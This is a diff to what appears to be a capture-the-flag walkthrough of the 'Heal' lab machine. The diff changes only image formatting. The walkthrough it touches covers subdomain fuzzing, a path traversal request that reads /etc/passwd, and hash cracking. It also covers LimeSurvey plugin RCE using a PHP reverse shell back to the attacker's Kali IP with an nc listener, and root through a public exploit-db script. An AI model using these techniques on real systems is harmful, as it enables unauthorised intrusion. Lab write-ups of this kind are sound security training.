@@ -9,8 +9,7 @@ VPN 10.10.11.46
 
 Ports found: 22, 80
 
-![](images/media/image1.png){width="4.538461286089239in"
-height="1.317004593175853in"}
+![](images/media/image1.png)
 
 3.  **SUBDOMAIN-FUZZING**
 
@@ -18,13 +17,11 @@ RUN: **ffuf -w
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u
 http://monitorsthree.htb -H \"Host:FUZZ.monitorsthree.htb\" -ac**
 
-![](images/media/image2.png){width="4.524886264216973in"
-height="2.0443667979002624in"}
+![](images/media/image2.png)
 
 4.  Add **api.heal.htb** to **/etc/hosts** file
 
-![](images/media/image3.png){width="4.511311242344707in"
-height="1.529468503937008in"}
+![](images/media/image3.png)
 
 5.  Open in Browser: heal.htb
 
@@ -33,33 +30,28 @@ height="1.529468503937008in"}
 - After that, check the survey button, hover over TAKE THE SURVEY (There
   is a hidden URL)
 
-![](images/media/image4.png){width="3.8626377952755906in"
-height="3.6200240594925632in"}
+![](images/media/image4.png)
 
-![](images/media/image5.png){width="3.890110454943132in"
-height="3.954897200349956in"}
+![](images/media/image5.png)
 
-6.  [Add to **take-survey.heal.htb** to **/etc/hosts** file]{.mark}
+6.  Add to **take-survey.heal.htb** to **/etc/hosts** file
 
 7.  Open the hidden page
 
 - Username **ralph** found
 
-![](images/media/image6.png){width="3.3461548556430447in"
-height="1.7374759405074365in"}
+![](images/media/image6.png)
 
 8.  Check hidden page. RUN: **dirsearch -u
     take-survey.heal.htb/index.php -t 50**
 
 **Result**
 
-![](images/media/image7.png){width="6.290972222222222in"
-height="0.4673611111111111in"}
+![](images/media/image7.png)
 
 **Opened**
 
-![](images/media/image8.png){width="4.252748250218723in"
-height="3.859695975503062in"}
+![](images/media/image8.png)
 
 9.  Go back to heal.htb/resume and login with your previously created
     account
@@ -68,25 +60,21 @@ height="3.859695975503062in"}
 
 - Page loaded with INTERCEPT ON
 
-![](images/media/image9.png){width="4.15594706911636in"
-height="2.5989009186351706in"}
+![](images/media/image9.png)
 
 - Result: 1 time forwarded. Send to Repeater
 
-![](images/media/image10.png){width="4.164835958005249in"
-height="2.5222364391951007in"}
+![](images/media/image10.png)
 
 - Added Path traversal
 
 **GET /download?filename=../../../../../etc/passwd HTTP/1.1**
 
-![](images/media/image11.png){width="5.598902012248469in"
-height="3.541998031496063in"}
+![](images/media/image11.png)
 
 - Search for HOME to find Users
 
-![](images/media/image12.png){width="3.7472528433945755in"
-height="1.1387773403324584in"}
+![](images/media/image12.png)
 
 Since we found that the website RUBY ON RAILS (api.heal.htb) used it, we
 searched and got it's config file address
@@ -96,25 +84,21 @@ searched and got it's config file address
 
 - **Click Send**
 
-![](images/media/image13.png){width="5.434066054243219in"
-height="3.554727690288714in"}
+![](images/media/image13.png)
 
 Download sqlite3 file
 
-![](images/media/image14.png){width="5.214285870516186in"
-height="3.2899660979877514in"}
+![](images/media/image14.png)
 
 11. Crack PASSWORD HASH
 
 - Create a txt file with the HASH inside
 
-![](images/media/image15.png){width="3.3076924759405073in"
-height="0.869319772528434in"}
+![](images/media/image15.png)
 
 - RUN: **john test.txt \--wordlist=/usr/share/wordlists/rockyou.txt**
 
-![](images/media/image16.png){width="6.302083333333333in"
-height="1.6041666666666667in"}
+![](images/media/image16.png)
 
 - Login via SSH not possible
 
@@ -123,39 +107,33 @@ height="1.6041666666666667in"}
 
 [**http://take-survey.heal.htb/index.php/admin/home.php**](http://take-survey.heal.htb/index.php/admin/home.php)
 
-![](images/media/image17.png){width="4.637363298337708in"
-height="3.063104768153981in"}
+![](images/media/image17.png)
 
 Website Verison, see below.
 
-![](images/media/image18.png){width="2.0604396325459318in"
-height="0.27405074365704285in"}
+![](images/media/image18.png)
 
 12. **LimeSurvey-RCE** (Find a script on Github)
 
 <https://github.com/Y1LD1R1M-1337/Limesurvey-RCE>
 
-![](images/media/image19.png){width="2.593406605424322in"
-height="2.065793963254593in"}
+![](images/media/image19.png)
 
 - Download **config.xml** and **php-rev.php** in Kali VM
 
 - Add **version 6.0** to **config.xml INFO: otherwise it won't work**
 
-![](images/media/image20.png){width="6.302083333333333in"
-height="3.263888888888889in"}
+![](images/media/image20.png)
 
 - Check your **Kali machine's IP-ADDRESS** (COMMAND: ifconfig)
 
-![](images/media/image21.png){width="3.8461548556430447in"
-height="0.27586067366579176in"}
+![](images/media/image21.png)
 
 - Put this IP in the **php-rev.php** script
 
 **Result:**
 
-![](images/media/image22.png){width="5.1593416447944005in"
-height="3.218969816272966in"}
+![](images/media/image22.png)
 
 - ZIP both files (config.xml and php-rev.php)
 
@@ -163,42 +141,35 @@ INFO: Open new Terminal in same directory as both files are located!
 
 RUN: **zip zipname config.xml php-rev.php**
 
-![](images/media/image23.png){width="5.093406605424322in"
-height="1.2268667979002625in"}
+![](images/media/image23.png)
 
 13. Upload zipname.zip + activate plugin
 
-![](images/media/image24.png){width="6.3in"
-height="1.4472222222222222in"}
+![](images/media/image24.png)
 
 Click 3^rd^ step and select the file **zipname.zip**
 
-![](images/media/image25.png){width="6.3in" height="3.6in"}
+![](images/media/image25.png)
 
 Push INSTALL
 
-![](images/media/image26.png){width="6.3in"
-height="2.7194444444444446in"}
+![](images/media/image26.png)
 
-![](images/media/image27.png){width="6.3in"
-height="3.4458333333333333in"}
+![](images/media/image27.png)
 
 Activate it
 
-![](images/media/image28.png){width="6.3in"
-height="0.9506944444444444in"}
+![](images/media/image28.png)
 
 Activated
 
-![](images/media/image29.png){width="6.3in"
-height="0.37777777777777777in"}
+![](images/media/image29.png)
 
 14. Start listener on Kali VM
 
 RUN: **nc -lvnp 100**
 
-![](images/media/image30.png){width="6.3in"
-height="1.1729166666666666in"}
+![](images/media/image30.png)
 
 15. To bounce shell, open this URL in Browser
 
@@ -206,8 +177,7 @@ height="1.1729166666666666in"}
 
 **SUCCEEDED**
 
-![](images/media/image31.png){width="6.3in"
-height="1.7513888888888889in"}
+![](images/media/image31.png)
 
 16. Change directory to /var/www/limesurvey/application/config
 
@@ -217,8 +187,7 @@ height="1.7513888888888889in"}
 
 This **PASSWORD** can be used with **USER= ron (SSH login works)**
 
-![](images/media/image32.png){width="6.3in"
-height="4.500694444444444in"}
+![](images/media/image32.png)
 
 **INFO:** There is only 1 ralph user in the table, his password is the
 same as the hash above = 147258369
@@ -227,8 +196,7 @@ same as the hash above = 147258369
 
 17. 1^st^ FLAG: Cat user.txt
 
-![](images/media/image33.png){width="4.353596894138232in"
-height="3.3131867891513562in"}
+![](images/media/image33.png)
 
 **[PRIVILEGE ESCALATION]{.underline}**
 
@@ -236,20 +204,17 @@ height="3.3131867891513562in"}
 
 2.  Start linpeas with: **./linpeas.sh**
 
-![](images/media/image34.png){width="7.0865135608048995in"
-height="1.554945319335083in"}
+![](images/media/image34.png)
 
 3.  Port forwarding: RUN: **ssh -L 8500:127.0.0.1:8500 <ron@heal.htb>**
 
-> ![](images/media/image35.png){width="4.902309711286089in"
-> height="3.5549453193350833in"}
+> ![](images/media/image35.png)
 
 4.  Open website **http://127.0.0.1:8500**, check source code
 
 **-Source code 1.19.2 found**
 
-> ![](images/media/image36.png){width="3.4890113735783026in"
-> height="1.187503280839895in"}
+> ![](images/media/image36.png)
 
 5.  Look for vulnerability <https://www.exploit-db.com/exploits/51117>
 
@@ -261,17 +226,14 @@ height="1.554945319335083in"}
 
 RUN: **nc -lvnp 100**
 
-> ![](images/media/image37.png){width="2.2307688101487315in"
-> height="0.8517049431321085in"}
+> ![](images/media/image37.png)
 
 7.  Send request to listener (to Kali VM)
 
 > RUN (on Kali VM): **python exploit.py 127.0.0.1 8500 Kali-IP 100 0**
 >
-> ![](images/media/image38.png){width="3.192308617672791in"
-> height="0.9669116360454943in"}
+> ![](images/media/image38.png)
 
 8.  Connection established. Found Root.txt
 
-![](images/media/image39.png){width="4.1703291776028in"
-height="3.901259842519685in"}
+![](images/media/image39.png)
